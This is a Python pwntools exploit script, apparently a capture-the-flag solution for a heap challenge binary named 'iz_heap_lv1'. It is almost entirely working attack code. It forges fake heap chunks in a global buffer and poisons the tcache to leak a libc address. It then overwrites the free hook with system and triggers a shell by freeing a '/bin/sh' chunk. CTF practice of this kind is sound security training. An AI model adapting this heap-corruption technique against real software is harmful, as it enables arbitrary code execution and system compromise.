from pwn import *

r = process('./iz_heap_lv1')
raw_input('debug')
name_add = 0x602100

def add(size, data):
	r.sendlineafter('Choice: ', '1')
	r.sendlineafter('Enter size: ', str(size))
	r.sendafter('Enter data: ', data)

def edit(ind, size, data):
	r.sendlineafter('Choice: ', '2')
	r.sendlineafter('Enter index: ', str(ind))
	r.sendlineafter('Enter size: ', str(size))
	r.sendafter('Enter data: ', data)

def delete(ind):
	r.sendlineafter('Choice: ', '3')
	r.sendlineafter('Enter index: ', str(ind))

def showname(choice, name):
	r.sendlineafter('Choice: ', '4')
	r.sendafter('(Y/N)', choice)
	if choice == 'Y':
		inputname(name)

def inputname(name):
	r.sendafter('Input name: ', name)

name = p64(name_add + 0x20) + p64(0x0)*2
name += p64(0x91)+ p64(0x0)*17 + p64(0x21) + p64(0x0)*3 + p64(0x21)
inputname(name)
add(0x20, 'linh')
delete(20)

name = p64(name_add + 0x20) + p64(0x0)*2
name += p64(0x91)+ p64(name_add + 0x20)
showname('Y', name)
add(0x80, p64(0x0))
add(0x80, 'dcedf')
log.info('tcache')
delete(20)

showname('Y', 'a'*28 + 'linh')
r.recvuntil('linh')
libc_base = u64(r.recv(6)+'\x00'*2) - 0x3ebca0
system_add = libc_base + 0x04f4e0
log.info('libc_base %#x' %libc_base)

name = p64(name_add + 0x20) + p64(0x0)*2
name += p64(0x21)
showname('Y', name)
delete(20)

name = p64(name_add + 0x20) + p64(0x0)*2
name += p64(0x21)+ p64(libc_base + 0x03ed8e8)
showname('Y', name)
add(0x10, '/bin/sh\x00')
add(0x10, p64(system_add))
delete(20)

r.interactive()
r.close()

# FLAG